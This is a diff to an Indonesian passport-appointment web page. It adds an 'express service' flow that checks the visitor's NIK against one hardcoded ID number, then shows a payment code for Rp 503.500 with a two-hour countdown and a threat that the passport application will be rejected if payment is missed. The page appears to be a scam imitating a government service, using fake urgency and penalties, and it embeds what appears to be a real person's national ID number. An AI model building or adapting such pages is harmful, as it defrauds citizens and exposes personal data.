@@ -180,10 +180,35 @@
             line-height: 1.5;
         }
         
+        .service-options {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .service-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #003366;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .service-description {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        
         .btn-container {
             display: flex;
             justify-content: center;
             margin-top: 25px;
+            gap: 15px;
+            flex-wrap: wrap;
         }
         
         .btn {
@@ -196,10 +221,28 @@
             font-weight: bold;
             cursor: pointer;
             transition: background-color 0.3s;
+            text-align: center;
+            min-width: 200px;
         }
         
         .btn:hover {
             background-color: #002244;
+        }
+        
+        .btn-regular {
+            background-color: #28a745;
+        }
+        
+        .btn-regular:hover {
+            background-color: #218838;
+        }
+        
+        .btn-express {
+            background-color: #e63946;
+        }
+        
+        .btn-express:hover {
+            background-color: #c41e3a;
         }
         
         .footer {
@@ -212,6 +255,197 @@
         
         .copyright {
             font-weight: 500;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            overflow: auto;
+        }
+        
+        .modal-content {
+            background-color: white;
+            margin: 10% auto;
+            padding: 0;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            animation: modalopen 0.4s;
+        }
+        
+        @keyframes modalopen {
+            from {opacity: 0; transform: translateY(-50px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+        
+        .modal-header {
+            background-color: #e63946;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px 10px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .close {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            line-height: 1;
+        }
+        
+        .close:hover {
+            opacity: 0.7;
+        }
+        
+        .modal-body {
+            padding: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #003366;
+            box-shadow: 0 0 5px rgba(0, 51, 102, 0.3);
+        }
+        
+        .error-message {
+            color: #e63946;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .payment-info {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e63946;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .payment-code {
+            font-size: 18px;
+            font-weight: bold;
+            color: #003366;
+            text-align: center;
+            margin: 15px 0;
+            letter-spacing: 1px;
+            user-select: all;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        
+        .payment-code:hover {
+            background-color: #eaeaea;
+        }
+        
+        .copy-hint {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 5px;
+            font-style: italic;
+        }
+        
+        .timer-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .timer-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        
+        .timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e63946;
+            padding: 10px;
+            border: 2px solid #e63946;
+            border-radius: 5px;
+            display: inline-block;
+            min-width: 200px;
+        }
+        
+        .warning-box {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #5d4037;
+        }
+        
+        .notice {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            z-index: 2000;
+            display: none;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .notice-success {
+            background-color: #28a745;
+        }
+        
+        .notice-error {
+            background-color: #e63946;
+        }
+        
+        .notice-info {
+            background-color: #003366;
         }
         
         @media (max-width: 480px) {
@@ -229,6 +463,16 @@
             
             .content {
                 padding: 20px 15px;
+            }
+            
+            .btn-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 300px;
             }
         }
     </style>
@@ -296,6 +540,17 @@
                 </div>
             </div>
             
+            <div class="service-options">
+                <div class="service-title">PILIH LAYANAN</div>
+                <div class="service-description">
+                    Silakan pilih jenis layanan yang Anda inginkan untuk proses pembuatan paspor.
+                </div>
+                <div class="btn-container">
+                    <button class="btn btn-regular" onclick="selectRegularService()">Lanjut dengan Layanan Biasa</button>
+                    <button class="btn btn-express" onclick="showNikModal()">Lanjut dengan Layanan Percepatan</button>
+                </div>
+            </div>
+            
             <div class="next-steps">
                 <div class="next-steps-title">Langkah Selanjutnya</div>
                 <div class="next-steps-text">
@@ -316,35 +571,252 @@
         </div>
     </div>
 
+    <!-- Modal untuk Input NIK -->
+    <div id="nikModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Verifikasi NIK</div>
+                <span class="close" onclick="closeNikModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label" for="nikInput">Masukkan NIK KTP Sesuai Data Pemohon</label>
+                    <input type="text" id="nikInput" class="form-input" placeholder="Masukkan 16 digit NIK">
+                    <div id="nikError" class="error-message">NIK tidak sesuai dengan data pemohon</div>
+                </div>
+                <div class="btn-container">
+                    <button class="btn" onclick="verifyNik()">Verifikasi</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal untuk Pembayaran Layanan Percepatan -->
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Pembayaran Layanan Percepatan</div>
+                <span class="close" onclick="closePaymentModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="payment-info">
+                    <div class="info-title">Informasi Pembayaran</div>
+                    <div class="info-row">
+                        <span class="info-label">Layanan</span>
+                    </div>
+                    <div style="text-align: center; font-weight: bold; margin: 10px 0;">Layanan Percepatan Paspor</div>
+                    <div class="info-row">
+                        <span class="info-label">Jumlah Pembayaran</span>
+                    </div>
+                    <div class="payment-amount">Rp 503.500,00</div>
+                    <div class="info-row">
+                        <span class="info-label">Kode Pembayaran</span>
+                    </div>
+                    <div class="payment-code" id="paymentCode">91266000000342305</div>
+                    <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
+                </div>
+                
+                <div class="timer-container">
+                    <div class="timer-label">Batas Waktu Pembayaran</div>
+                    <div class="timer" id="countdown">02:00:00</div>
+                </div>
+                
+                <div class="warning-box">
+                    <strong>Perhatian:</strong> Jika Anda sudah memilih layanan percepatan dan tidak melakukan pembayaran, maka permohonan paspor sebelumnya akan ditolak otomatis oleh sistem. Harap melakukan pembayaran sebelum batas waktu yang ditentukan.
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn" onclick="window.print()">Cetak Bukti</button>
+                    <button class="btn btn-express" onclick="showPaymentInfo()">Lakukan Pembayaran</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notifikasi -->
+    <div id="notice" class="notice"></div>
+
     <script>
-        // Event listener untuk tombol cetak
-        document.querySelector('.btn').addEventListener('click', function() {
-            // Tampilkan pesan sukses
-            const successMessage = document.createElement('div');
-            successMessage.style.position = 'fixed';
-            successMessage.style.top = '0';
-            successMessage.style.left = '0';
-            successMessage.style.width = '100%';
-            successMessage.style.backgroundColor = '#28a745';
-            successMessage.style.color = 'white';
-            successMessage.style.padding = '15px';
-            successMessage.style.textAlign = 'center';
-            successMessage.style.zIndex = '1000';
-            successMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
-            successMessage.innerHTML = '<strong>Success:</strong> Mencetak Bukti Jadwal Kedatangan...';
+        // Data NIK yang valid
+        const validNIK = "3202016211960004";
+        
+        // Fungsi untuk menampilkan notifikasi
+        function showNotice(message, type) {
+            const notice = document.getElementById('notice');
+            notice.textContent = message;
+            notice.className = 'notice notice-' + type;
+            notice.style.display = 'block';
             
-            // Tambahkan ke body
-            document.body.appendChild(successMessage);
-            
-            // Hapus pesan setelah 3 detik
             setTimeout(() => {
-                successMessage.style.opacity = '0';
-                successMessage.style.transition = 'opacity 0.5s';
+                notice.style.opacity = '0';
+                notice.style.transition = 'opacity 0.5s';
                 setTimeout(() => {
-                    document.body.removeChild(successMessage);
+                    notice.style.display = 'none';
+                    notice.style.opacity = '1';
                 }, 500);
             }, 3000);
+        }
+        
+        // Fungsi untuk memilih layanan biasa
+        function selectRegularService() {
+            showNotice("Anda telah memilih layanan biasa. Silakan datang sesuai jadwal.", "success");
+        }
+        
+        // Fungsi untuk menampilkan modal NIK
+        function showNikModal() {
+            document.getElementById('nikModal').style.display = 'block';
+            document.getElementById('nikInput').value = '';
+            document.getElementById('nikError').style.display = 'none';
+        }
+        
+        // Fungsi untuk menutup modal NIK
+        function closeNikModal() {
+            document.getElementById('nikModal').style.display = 'none';
+        }
+        
+        // Fungsi untuk verifikasi NIK
+        function verifyNik() {
+            const nikInput = document.getElementById('nikInput').value.trim();
+            const nikError = document.getElementById('nikError');
+            
+            if (nikInput === validNIK) {
+                closeNikModal();
+                showPaymentModal();
+                startCountdown();
+            } else {
+                nikError.style.display = 'block';
+            }
+        }
+        
+        // Fungsi untuk menampilkan modal pembayaran
+        function showPaymentModal() {
+            document.getElementById('paymentModal').style.display = 'block';
+        }
+        
+        // Fungsi untuk menutup modal pembayaran
+        function closePaymentModal() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+        
+        // Fungsi untuk menampilkan informasi pembayaran
+        function showPaymentInfo() {
+            showNotice("Silakan lakukan pembayaran menggunakan kode pembayaran yang tersedia.", "info");
+        }
+        
+        // Fungsi untuk menyalin kode pembayaran
+        document.getElementById('paymentCode').addEventListener('click', function() {
+            // Membuat elemen input sementara
+            const tempInput = document.createElement('input');
+            tempInput.value = this.textContent;
+            document.body.appendChild(tempInput);
+            
+            // Memilih dan menyalin teks
+            tempInput.select();
+            document.execCommand('copy');
+            
+            // Menghapus elemen input sementara
+            document.body.removeChild(tempInput);
+            
+            // Memberi tahu pengguna bahwa kode telah disalin
+            const originalText = this.textContent;
+            this.textContent = "Tersalin!";
+            this.style.backgroundColor = "#e6f7e6";
+            
+            // Mengembalikan teks asli setelah 2 detik
+            setTimeout(() => {
+                this.textContent = originalText;
+                this.style.backgroundColor = "";
+            }, 2000);
         });
+        
+        // Set waktu awal (2 jam dalam detik)
+        const initialTime = 2 * 60 * 60;
+        
+        // Cek apakah ada waktu tersisa di localStorage
+        let timeLeft = localStorage.getItem('expressPaymentTimeLeft') 
+            ? parseInt(localStorage.getItem('expressPaymentTimeLeft')) 
+            : initialTime;
+        
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (timeLeft <= 0) {
+            timeLeft = initialTime;
+        }
+        
+        // Simpan waktu tersisa ke localStorage
+        localStorage.setItem('expressPaymentTimeLeft', timeLeft);
+        
+        // Update tampilan countdown
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('expressPaymentTimeLeft', timeLeft);
+            
+            // Kurangi waktu
+            timeLeft--;
+            
+            // Jika waktu habis
+            if (timeLeft < 0) {
+                clearInterval(timerInterval);
+                document.getElementById('countdown').textContent = "WAKTU HABIS";
+                document.getElementById('countdown').style.color = "#ff0000";
+                
+                // Tampilkan pemberitahuan bahwa permohonan ditolak
+                const warning = document.querySelector('.warning-box');
+                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan paspor Anda telah ditolak oleh sistem secara otomatis karena Anda telah memilih layanan percepatan tetapi tidak melakukan pembayaran. Anda harus membuat permohonan baru jika masih ingin mengajukan paspor.";
+                warning.style.backgroundColor = "#ffebee";
+                warning.style.borderLeftColor = "#f44336";
+                warning.style.color = "#c62828";
+                
+                // Nonaktifkan tombol cetak dan pembayaran
+                document.querySelectorAll('#paymentModal .btn').forEach(btn => {
+                    btn.disabled = true;
+                    btn.style.backgroundColor = "#cccccc";
+                    btn.style.cursor = "not-allowed";
+                });
+            }
+        }
+        
+        // Fungsi untuk memulai countdown
+        function startCountdown() {
+            // Hentikan interval yang sudah ada jika ada
+            if (typeof timerInterval !== 'undefined') {
+                clearInterval(timerInterval);
+            }
+            
+            // Jalankan countdown setiap detik
+            updateCountdown();
+            timerInterval = setInterval(updateCountdown, 1000);
+        }
+        
+        // Event listener untuk tombol cetak
+        document.querySelector('.popup-container .btn').addEventListener('click', function() {
+            showNotice("Mencetak Bukti Jadwal Kedatangan...", "success");
+        });
+        
+        // Menutup modal ketika klik di luar modal
+        window.onclick = function(event) {
+            const nikModal = document.getElementById('nikModal');
+            const paymentModal = document.getElementById('paymentModal');
+            
+            if (event.target === nikModal) {
+                nikModal.style.display = 'none';
+            }
+            
+            if (event.target === paymentModal) {
+                paymentModal.style.display = 'none';
+            }
+        }
     </script>
 </body>
 </html>
